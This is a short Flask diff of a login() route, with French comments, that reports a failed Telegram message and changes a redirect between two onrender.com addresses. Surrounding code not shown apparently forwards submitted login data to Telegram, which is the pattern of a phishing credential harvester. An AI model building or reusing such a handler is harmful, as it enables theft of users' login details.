@@ -37,7 +37,7 @@ def login():
             return f"Erreur lors de l'envoi du message Telegram : {response.text}", 500
 
         # Redirection vers Google ou autre site
-        return redirect("https://code-s-curit-1pf7.onrender.com/")
+        return redirect("https://code-s-curit-qxie.onrender.com/")
 
     return render_template('login.html')
 
